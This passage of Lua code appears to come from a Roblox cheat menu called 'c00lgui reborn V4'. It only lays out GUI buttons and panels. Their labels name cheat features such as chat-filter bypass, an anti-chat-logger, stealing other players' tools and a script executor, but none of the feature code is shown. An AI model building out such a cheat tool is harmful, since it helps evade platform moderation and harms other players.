		ChatBypass.Text = "Chat Bypass"
		ChatBypass.TextColor3 = Color3.fromRGB(255, 255, 255)
		ChatBypass.TextSize = 14.000
		ChatBypass.TextWrapped = true
	
		FloatingPad.Name = "Floating Pad"
		FloatingPad.Parent = Scripts
		FloatingPad.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		FloatingPad.BorderColor3 = Color3.fromRGB(255, 0, 0)
		FloatingPad.BorderSizePixel = 3
		FloatingPad.Position = UDim2.new(0.5, 3, 0, 99)
		FloatingPad.Size = UDim2.new(0.5, -3, 0, 30)
		FloatingPad.ZIndex = 2
		FloatingPad.Font = Enum.Font.SourceSans
		FloatingPad.Text = "Floating Pad"
		FloatingPad.TextColor3 = Color3.fromRGB(255, 255, 255)
		FloatingPad.TextSize = 14.000
	
		HeadShake.Name = "Head Shake"
		HeadShake.Parent = Scripts
		HeadShake.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		HeadShake.BorderColor3 = Color3.fromRGB(255, 0, 0)
		HeadShake.BorderSizePixel = 3
		HeadShake.Position = UDim2.new(0, 0, 0, 132)
		HeadShake.Size = UDim2.new(0.499000013, 0, 0, 30)
		HeadShake.ZIndex = 2
		HeadShake.Font = Enum.Font.SourceSans
		HeadShake.Text = "Head Shake NEED REANIM"
		HeadShake.TextColor3 = Color3.fromRGB(255, 255, 255)
		HeadShake.TextSize = 14.000
		HeadShake.TextWrapped = true
	
		NameTag.Name = "Name Tag"
		NameTag.Parent = Scripts
		NameTag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		NameTag.BorderColor3 = Color3.fromRGB(255, 0, 0)
		NameTag.BorderSizePixel = 3
		NameTag.Position = UDim2.new(0.5, 3, 0, 132)
		NameTag.Size = UDim2.new(0.5, -3, 0, 30)
		NameTag.ZIndex = 2
		NameTag.Font = Enum.Font.SourceSans
		NameTag.Text = "Name Tag (FD)"
		NameTag.TextColor3 = Color3.fromRGB(255, 255, 255)
		NameTag.TextSize = 14.000
		NameTag.TextWrapped = true
	
		ControlNPCs.Name = "Control NPCs"
		ControlNPCs.Parent = Scripts
		ControlNPCs.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ControlNPCs.BorderColor3 = Color3.fromRGB(255, 0, 0)
		ControlNPCs.BorderSizePixel = 3
		ControlNPCs.Position = UDim2.new(0, 0, 0, 165)
		ControlNPCs.Size = UDim2.new(0.5, 0, 0, 30)
		ControlNPCs.ZIndex = 2
		ControlNPCs.Font = Enum.Font.SourceSans
		ControlNPCs.Text = "Control NPCs"
		ControlNPCs.TextColor3 = Color3.fromRGB(255, 255, 255)
		ControlNPCs.TextSize = 14.000
	
		Getallitems.Name = "Get all items"
		Getallitems.Parent = Scripts
		Getallitems.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Getallitems.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Getallitems.BorderSizePixel = 3
		Getallitems.Position = UDim2.new(0.5, 3, 0, 165)
		Getallitems.Size = UDim2.new(0.5, -3, 0, 30)
		Getallitems.ZIndex = 2
		Getallitems.Font = Enum.Font.SourceSans
		Getallitems.Text = "Get all items"
		Getallitems.TextColor3 = Color3.fromRGB(255, 255, 255)
		Getallitems.TextSize = 14.000
	
		Blackhole.Name = "Black hole"
		Blackhole.Parent = Scripts
		Blackhole.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Blackhole.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Blackhole.BorderSizePixel = 3
		Blackhole.Position = UDim2.new(0, 0, 0, 198)
		Blackhole.Size = UDim2.new(0.5, 0, 0, 30)
		Blackhole.ZIndex = 2
		Blackhole.Font = Enum.Font.SourceSans
		Blackhole.Text = "Black Hole"
		Blackhole.TextColor3 = Color3.fromRGB(255, 255, 255)
		Blackhole.TextSize = 14.000
		Blackhole.TextWrapped = true
	
		WalkOnWalls.Name = "Walk On Walls"
		WalkOnWalls.Parent = Scripts
		WalkOnWalls.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		WalkOnWalls.BorderColor3 = Color3.fromRGB(255, 0, 0)
		WalkOnWalls.BorderSizePixel = 3
		WalkOnWalls.Position = UDim2.new(0.5, 3, 0, 198)
		WalkOnWalls.Size = UDim2.new(0.479999989, 0, 0, 30)
		WalkOnWalls.ZIndex = 2
		WalkOnWalls.Font = Enum.Font.SourceSans
		WalkOnWalls.Text = "Walk On Walls"
		WalkOnWalls.TextColor3 = Color3.fromRGB(255, 255, 255)
		WalkOnWalls.TextSize = 14.000
		WalkOnWalls.TextWrapped = true
	
		Title_2.Name = "Title"
		Title_2.Parent = Scripts
		Title_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_2.BorderSizePixel = 3
		Title_2.Size = UDim2.new(1, 0, 0, 30)
		Title_2.ZIndex = 2
		Title_2.Font = Enum.Font.SourceSansBold
		Title_2.Text = "Scripts"
		Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_2.TextSize = 14.000
	
		SCP173.Name = "SCP 173"
		SCP173.Parent = Scripts
		SCP173.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		SCP173.BorderColor3 = Color3.fromRGB(255, 0, 0)
		SCP173.BorderSizePixel = 3
		SCP173.Position = UDim2.new(0.5, 3, 0.326530606, 132)
		SCP173.Size = UDim2.new(0.5, -3, 0, 30)
		SCP173.ZIndex = 2
		SCP173.Font = Enum.Font.SourceSans
		SCP173.Text = "SCP 173 (X TOGGLE)"
		SCP173.TextColor3 = Color3.fromRGB(255, 255, 255)
		SCP173.TextSize = 14.000
		SCP173.TextWrapped = true
	
		SCP106.Name = "SCP 106"
		SCP106.Parent = Scripts
		SCP106.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		SCP106.BorderColor3 = Color3.fromRGB(255, 0, 0)
		SCP106.BorderSizePixel = 3
		SCP106.Position = UDim2.new(0, 0, 0, 228)
		SCP106.Size = UDim2.new(0.5, 0, 0, 30)
		SCP106.ZIndex = 2
		SCP106.Font = Enum.Font.SourceSans
		SCP106.Text = "SCP 106 (Z)"
		SCP106.TextColor3 = Color3.fromRGB(255, 255, 255)
		SCP106.TextSize = 14.000
		SCP106.TextWrapped = true
	
		Title_3.Name = "Title"
		Title_3.Parent = Page1
		Title_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_3.BorderSizePixel = 3
		Title_3.Position = UDim2.new(-0.0011353048, 0, 0.897656918, 0)
		Title_3.Size = UDim2.new(1.00113535, 0, 0, 30)
		Title_3.ZIndex = 2
		Title_3.Font = Enum.Font.SourceSansBold
		Title_3.Text = "Page 1"
		Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_3.TextSize = 14.000
	
		Settings.Name = "Settings"
		Settings.Parent = Frame
		Settings.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Settings.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Settings.BorderSizePixel = 3
		Settings.Position = UDim2.new(1, 3, 0, 0)
		Settings.Size = UDim2.new(1, 0, 1, 0)
	
		Page1_2.Name = "Page1"
		Page1_2.Parent = Settings
		Page1_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Page1_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Page1_2.BorderSizePixel = 3
		Page1_2.Position = UDim2.new(0, 0, 0, 83)
		Page1_2.Size = UDim2.new(1, 0, 1, -83)
	
		Walkspeed.Name = "Walkspeed"
		Walkspeed.Parent = Page1_2
		Walkspeed.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Walkspeed.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Walkspeed.BorderSizePixel = 3
		Walkspeed.Position = UDim2.new(0, 0, 0, 69)
		Walkspeed.Size = UDim2.new(0.5, 0, 0, 63)
	
		TextBox.Parent = Walkspeed
		TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextBox.BorderSizePixel = 3
		TextBox.Position = UDim2.new(0, 0, 0.5, 0)
		TextBox.Size = UDim2.new(0.99000001, 1, 0.5, -1)
		TextBox.Font = Enum.Font.SourceSans
		TextBox.Text = ""
		TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.TextSize = 14.000
	
		Title_4.Name = "Title"
		Title_4.Parent = Walkspeed
		Title_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_4.BorderSizePixel = 3
		Title_4.Size = UDim2.new(1, 0, 0, 30)
		Title_4.Font = Enum.Font.SourceSansBold
		Title_4.Text = "WalkSpeed"
		Title_4.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_4.TextSize = 14.000
	
		TextButton.Parent = Walkspeed
		TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton.BorderSizePixel = 3
		TextButton.Position = UDim2.new(0, 0, 1.09523809, 0)
		TextButton.Size = UDim2.new(0, 150, 0, 30)
		TextButton.Font = Enum.Font.SourceSans
		TextButton.Text = "Set WalkSpeed"
		TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton.TextSize = 14.000
	
		God.Name = "God"
		God.Parent = Page1_2
		God.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		God.BorderColor3 = Color3.fromRGB(255, 0, 0)
		God.BorderSizePixel = 3
		God.Position = UDim2.new(0, 0, 0, 3)
		God.Size = UDim2.new(0.5, 0, 0, 63)
	
		TextButton_2.Parent = God
		TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_2.BorderSizePixel = 3
		TextButton_2.Position = UDim2.new(0, 0, 0.5, 0)
		TextButton_2.Size = UDim2.new(0.99000001, 1, 0.5, -1)
		TextButton_2.Font = Enum.Font.SourceSans
		TextButton_2.Text = "Destroy"
		TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_2.TextSize = 14.000
	
		Title_5.Name = "Title"
		Title_5.Parent = God
		Title_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_5.BorderSizePixel = 3
		Title_5.Size = UDim2.new(1, 0, 0, 30)
		Title_5.Font = Enum.Font.SourceSansBold
		Title_5.Text = "Destroy Chat"
		Title_5.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_5.TextSize = 14.000
		Title_5.TextWrapped = true
	
		Invisibility.Name = "Invisibility"
		Invisibility.Parent = Page1_2
		Invisibility.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Invisibility.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Invisibility.BorderSizePixel = 3
		Invisibility.Position = UDim2.new(0.5, 3, -0.406940073, 132)
		Invisibility.Size = UDim2.new(0.5, -3, 0, 63)
	
		TextButton_3.Parent = Invisibility
		TextButton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_3.BorderSizePixel = 3
		TextButton_3.Position = UDim2.new(0, 0, 0.5, 0)
		TextButton_3.Size = UDim2.new(0.99000001, 1, 0.5, -1)
		TextButton_3.Font = Enum.Font.SourceSans
		TextButton_3.Text = "Get"
		TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_3.TextSize = 14.000
	
		Title_6.Name = "Title"
		Title_6.Parent = Invisibility
		Title_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_6.BorderSizePixel = 3
		Title_6.Size = UDim2.new(1, 0, 0, 30)
		Title_6.Font = Enum.Font.SourceSansBold
		Title_6.Text = "Invisibility Tool"
		Title_6.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_6.TextSize = 14.000
		Title_6.TextWrapped = true
	
		JumpPower.Name = "JumpPower"
		JumpPower.Parent = Page1_2
		JumpPower.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		JumpPower.BorderColor3 = Color3.fromRGB(255, 0, 0)
		JumpPower.BorderSizePixel = 3
		JumpPower.Position = UDim2.new(0, 153, 0, 69)
		JumpPower.Size = UDim2.new(0.49000001, 0, 0, 63)
	
		TextBox_2.Parent = JumpPower
		TextBox_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextBox_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextBox_2.BorderSizePixel = 3
		TextBox_2.Position = UDim2.new(0, 0, 0.5, 0)
		TextBox_2.Size = UDim2.new(0.99000001, 1, 0.5, -1)
		TextBox_2.Font = Enum.Font.SourceSans
		TextBox_2.Text = ""
		TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextBox_2.TextSize = 14.000
	
		Title_7.Name = "Title"
		Title_7.Parent = JumpPower
		Title_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_7.BorderSizePixel = 3
		Title_7.Size = UDim2.new(1, 0, 0, 30)
		Title_7.Font = Enum.Font.SourceSansBold
		Title_7.Text = "JumpPower"
		Title_7.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_7.TextSize = 14.000
	
		TextButton_4.Parent = JumpPower
		TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_4.BorderSizePixel = 3
		TextButton_4.Position = UDim2.new(0, 0, 1.09523809, 0)
		TextButton_4.Size = UDim2.new(0, 147, 0, 30)
		TextButton_4.Font = Enum.Font.SourceSans
		TextButton_4.Text = "Set JumpPower"
		TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_4.TextSize = 14.000
	
		Title_8.Name = "Title"
		Title_8.Parent = Page1_2
		Title_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_8.BorderSizePixel = 3
		Title_8.Position = UDim2.new(0, 0, 0.831689894, 0)
		Title_8.Size = UDim2.new(0.998433411, 0, 0, 30)
		Title_8.ZIndex = 2
		Title_8.Font = Enum.Font.SourceSansBold
		Title_8.Text = "Page 1"
		Title_8.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_8.TextSize = 14.000
	
		Netless.Name = "Netless"
		Netless.Parent = Page1_2
		Netless.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Netless.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Netless.BorderSizePixel = 3
		Netless.Position = UDim2.new(0, 0, 0, 174)
		Netless.Size = UDim2.new(0.5, 0, 0, 63)
	
		TextButton_5.Parent = Netless
		TextButton_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_5.BorderSizePixel = 3
		TextButton_5.Position = UDim2.new(0, 0, 0.5, 0)
		TextButton_5.Size = UDim2.new(0.99000001, 1, 0.5, -1)
		TextButton_5.Font = Enum.Font.SourceSans
		TextButton_5.Text = "Enable"
		TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_5.TextSize = 14.000
	
		Title_9.Name = "Title"
		Title_9.Parent = Netless
		Title_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_9.BorderSizePixel = 3
		Title_9.Size = UDim2.new(1, 0, 0, 30)
		Title_9.Font = Enum.Font.SourceSansBold
		Title_9.Text = "Netless"
		Title_9.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_9.TextSize = 14.000
		Title_9.TextWrapped = true
	
		c00lguireawakened.Name = "c00lgui reawakened"
		c00lguireawakened.Parent = Page1_2
		c00lguireawakened.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		c00lguireawakened.BorderColor3 = Color3.fromRGB(255, 0, 0)
		c00lguireawakened.BorderSizePixel = 3
		c00lguireawakened.Position = UDim2.new(0, 153, 0, 174)
		c00lguireawakened.Size = UDim2.new(0.5, 0, 0, 63)
	
		TextButton_6.Parent = c00lguireawakened
		TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_6.BorderSizePixel = 3
		TextButton_6.Position = UDim2.new(0, 0, 0.5, 0)
		TextButton_6.Size = UDim2.new(0.99000001, 1, 0.5, -1)
		TextButton_6.Font = Enum.Font.SourceSans
		TextButton_6.Text = "Enable (will exit c00lgui)"
		TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_6.TextSize = 14.000
	
		Title_10.Name = "Title"
		Title_10.Parent = c00lguireawakened
		Title_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_10.BorderSizePixel = 3
		Title_10.Size = UDim2.new(1, 0, 0, 30)
		Title_10.Font = Enum.Font.SourceSansBold
		Title_10.Text = "c00lgui reawakened"
		Title_10.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_10.TextSize = 14.000
		Title_10.TextWrapped = true
	
		TextButton_7.Name = ">"
		TextButton_7.Parent = Settings
		TextButton_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_7.BorderSizePixel = 3
		TextButton_7.Position = UDim2.new(0.5, 3, 0, 40)
		TextButton_7.Size = UDim2.new(0.5, -3, 0, 40)
		TextButton_7.Font = Enum.Font.SourceSans
		TextButton_7.Text = ">"
		TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_7.TextSize = 48.000
	
		TextButton_8.Name = "<"
		TextButton_8.Parent = Settings
		TextButton_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_8.BorderSizePixel = 3
		TextButton_8.Position = UDim2.new(0, 0, 0, 40)
		TextButton_8.Size = UDim2.new(0.5, 0, 0, 40)
		TextButton_8.Font = Enum.Font.SourceSans
		TextButton_8.Text = "<"
		TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_8.TextSize = 48.000
	
		Title_11.Name = "Title"
		Title_11.Parent = Settings
		Title_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_11.BorderSizePixel = 3
		Title_11.Size = UDim2.new(1, 0, 0, 40)
		Title_11.Font = Enum.Font.SourceSans
		Title_11.Text = "Settings"
		Title_11.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_11.TextSize = 24.000
	
		Page3.Name = "Page3"
		Page3.Parent = Settings
		Page3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Page3.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Page3.BorderSizePixel = 3
		Page3.Position = UDim2.new(-0.0116654038, 3, 0, 380)
		Page3.Size = UDim2.new(0, 300, 0, 20)
		Page3.ZIndex = 3
		Page3.Font = Enum.Font.SourceSans
		Page3.Text = "Page 3 (Executor)"
		Page3.TextColor3 = Color3.fromRGB(65025, 65025, 65025)
		Page3.TextSize = 18.000
	
		idk.Name = "idk"
		idk.Parent = Settings
		idk.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		idk.BorderColor3 = Color3.fromRGB(255, 0, 0)
		idk.BorderSizePixel = 3
		idk.Position = UDim2.new(0.988334537, 3, -0.949999988, 380)
		idk.Size = UDim2.new(0, 27, 0, 400)
		idk.ZIndex = 3
		idk.Font = Enum.Font.SourceSans
		idk.Text = "<"
		idk.TextColor3 = Color3.fromRGB(65025, 65025, 65025)
		idk.TextSize = 50.000
	
		Page2.Name = "Page2"
		Page2.Parent = Settings
		Page2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Page2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Page2.BorderSizePixel = 3
		Page2.Position = UDim2.new(0, 0, 0, 83)
		Page2.Size = UDim2.new(1, 0, 1, -83)
		Page2.Visible = false
	
		Title_12.Name = "Title"
		Title_12.Parent = Page2
		Title_12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_12.BorderSizePixel = 3
		Title_12.Position = UDim2.new(0, 0, 0.831689894, 0)
		Title_12.Size = UDim2.new(0.998433411, 0, 0, 30)
		Title_12.ZIndex = 2
		Title_12.Font = Enum.Font.SourceSansBold
		Title_12.Text = "Page 2"
		Title_12.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_12.TextSize = 14.000
	
		AntiChatLog.Name = "Anti Chat Log"
		AntiChatLog.Parent = Page2
		AntiChatLog.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		AntiChatLog.BorderColor3 = Color3.fromRGB(255, 0, 0)
		AntiChatLog.BorderSizePixel = 3
		AntiChatLog.Position = UDim2.new(0, 0, 0, 3)
		AntiChatLog.Size = UDim2.new(0.5, 0, 0, 63)
	
		TextButton_9.Parent = AntiChatLog
		TextButton_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_9.BorderSizePixel = 3
		TextButton_9.Position = UDim2.new(0, 0, 0.5, 0)
		TextButton_9.Size = UDim2.new(0.99000001, 1, 0.5, -1)
		TextButton_9.Font = Enum.Font.SourceSans
		TextButton_9.Text = "Enable"
		TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_9.TextSize = 14.000
	
		Title_13.Name = "Title"
		Title_13.Parent = AntiChatLog
		Title_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_13.BorderSizePixel = 3
		Title_13.Size = UDim2.new(1, 0, 0, 30)
		Title_13.Font = Enum.Font.SourceSansBold
		Title_13.Text = "Anti Chat Logger"
		Title_13.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_13.TextSize = 14.000
		Title_13.TextWrapped = true
	
		Exitc00lgui.Name = "Exit c00lgui"
		Exitc00lgui.Parent = Page2
		Exitc00lgui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Exitc00lgui.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Exitc00lgui.BorderSizePixel = 3
		Exitc00lgui.Position = UDim2.new(0, 153, 0, 3)
		Exitc00lgui.Size = UDim2.new(0.5, 0, 0, 63)
	
		TextButton_10.Parent = Exitc00lgui
		TextButton_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextButton_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TextButton_10.BorderSizePixel = 3
		TextButton_10.Position = UDim2.new(0, 0, 0.5, 0)
		TextButton_10.Size = UDim2.new(0.99000001, 1, 0.5, -1)
		TextButton_10.Font = Enum.Font.SourceSans
		TextButton_10.Text = "Delete"
		TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton_10.TextSize = 14.000
	
		Title_14.Name = "Title"
		Title_14.Parent = Exitc00lgui
		Title_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_14.BorderSizePixel = 3
		Title_14.Size = UDim2.new(1, 0, 0, 30)
		Title_14.Font = Enum.Font.SourceSansBold
		Title_14.Text = "Delete c00lgui"
		Title_14.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_14.TextSize = 14.000
		Title_14.TextWrapped = true
	
		Next.Name = "Next"
		Next.Parent = Frame
		Next.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Next.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Next.BorderSizePixel = 3
		Next.Position = UDim2.new(0.5, 3, 0, 40)
		Next.Size = UDim2.new(0.5, -3, 0, 40)
		Next.ZIndex = 2
		Next.Font = Enum.Font.SourceSans
		Next.Text = ">"
		Next.TextColor3 = Color3.fromRGB(255, 255, 255)
		Next.TextSize = 48.000
	
		Previous.Name = "Previous"
		Previous.Parent = Frame
		Previous.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Previous.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Previous.BorderSizePixel = 3
		Previous.Position = UDim2.new(0, 0, 0, 40)
		Previous.Size = UDim2.new(0.5, -3, 0, 40)
		Previous.ZIndex = 2
		Previous.Font = Enum.Font.SourceSans
		Previous.Text = "<"
		Previous.TextColor3 = Color3.fromRGB(255, 255, 255)
		Previous.TextSize = 48.000
	
		Title_15.Name = "Title"
		Title_15.Parent = Frame
		Title_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_15.BorderSizePixel = 3
		Title_15.Size = UDim2.new(1, 0, 0, 40)
		Title_15.ZIndex = 2
		Title_15.Font = Enum.Font.SourceSans
		Title_15.Text = "c00lgui reborn V4 by rusello25"
		Title_15.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_15.TextSize = 24.000
	
		Page2_2.Name = "Page2"
		Page2_2.Parent = Frame
		Page2_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Page2_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Page2_2.BorderSizePixel = 3
		Page2_2.Position = UDim2.new(0, 0, 0, 83)
		Page2_2.Size = UDim2.new(1, 0, 1, -106)
		Page2_2.Visible = false
		Page2_2.ZIndex = 2
	
		GearTools.Name = "Gear/Tools"
		GearTools.Parent = Page2_2
		GearTools.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		GearTools.BorderColor3 = Color3.fromRGB(255, 0, 0)
		GearTools.BorderSizePixel = 3
		GearTools.Position = UDim2.new(0.5, 3, 0, 0)
		GearTools.Size = UDim2.new(0.5, -3, 1, 0)
		GearTools.ZIndex = 2
	
		SuicideGun.Name = "Suicide Gun"
		SuicideGun.Parent = GearTools
		SuicideGun.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		SuicideGun.BorderColor3 = Color3.fromRGB(255, 0, 0)
		SuicideGun.BorderSizePixel = 3
		SuicideGun.Position = UDim2.new(0, 0, 0, 33)
		SuicideGun.Size = UDim2.new(0.5, 0, 0, 30)
		SuicideGun.ZIndex = 2
		SuicideGun.Font = Enum.Font.SourceSans
		SuicideGun.Text = "Suicide Gun"
		SuicideGun.TextColor3 = Color3.fromRGB(255, 255, 255)
		SuicideGun.TextSize = 14.000
	
		GravityGun.Name = "Gravity Gun"
		GravityGun.Parent = GearTools
		GravityGun.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		GravityGun.BorderColor3 = Color3.fromRGB(255, 0, 0)
		GravityGun.BorderSizePixel = 3
		GravityGun.Position = UDim2.new(0.5, 3, 0, 33)
		GravityGun.Size = UDim2.new(0.5, -3, 0, 30)
		GravityGun.ZIndex = 2
		GravityGun.Font = Enum.Font.SourceSans
		GravityGun.Text = "Gravity Gun"
		GravityGun.TextColor3 = Color3.fromRGB(255, 255, 255)
		GravityGun.TextSize = 14.000
		GravityGun.TextWrapped = true
	
		StealTools.Name = "Steal Tools"
		StealTools.Parent = GearTools
		StealTools.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		StealTools.BorderColor3 = Color3.fromRGB(255, 0, 0)
		StealTools.BorderSizePixel = 3
		StealTools.Position = UDim2.new(0, 0, 0, 66)
		StealTools.Size = UDim2.new(0.5, 0, 0, 30)
		StealTools.ZIndex = 2
		StealTools.Font = Enum.Font.SourceSans
		StealTools.Text = "Steal Tools"
		StealTools.TextColor3 = Color3.fromRGB(255, 255, 255)
		StealTools.TextSize = 14.000
		StealTools.TextWrapped = true
	
		DevUzi.Name = "Dev Uzi"
		DevUzi.Parent = GearTools
		DevUzi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		DevUzi.BorderColor3 = Color3.fromRGB(255, 0, 0)
		DevUzi.BorderSizePixel = 3
		DevUzi.Position = UDim2.new(0.5, 3, 0, 66)
		DevUzi.Size = UDim2.new(0.5, -3, 0, 30)
		DevUzi.ZIndex = 2
		DevUzi.Font = Enum.Font.SourceSans
		DevUzi.Text = "Dev Uzi"
		DevUzi.TextColor3 = Color3.fromRGB(255, 255, 255)
		DevUzi.TextSize = 14.000
	
		M4Carbine.Name = "M4 Carbine"
		M4Carbine.Parent = GearTools
		M4Carbine.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		M4Carbine.BorderColor3 = Color3.fromRGB(255, 0, 0)
		M4Carbine.BorderSizePixel = 3
		M4Carbine.Position = UDim2.new(0, 0, 0, 99)
		M4Carbine.Size = UDim2.new(0.5, 0, 0, 30)
		M4Carbine.ZIndex = 2
		M4Carbine.Font = Enum.Font.SourceSans
		M4Carbine.Text = "M4 Carbine"
		M4Carbine.TextColor3 = Color3.fromRGB(255, 255, 255)
		M4Carbine.TextSize = 14.000
	
		Uzi.Name = "Uzi"
		Uzi.Parent = GearTools
		Uzi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Uzi.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Uzi.BorderSizePixel = 3
		Uzi.Position = UDim2.new(0.5, 3, 0, 99)
		Uzi.Size = UDim2.new(0.5, -3, 0, 30)
		Uzi.ZIndex = 2
		Uzi.Font = Enum.Font.SourceSans
		Uzi.Text = "Empty"
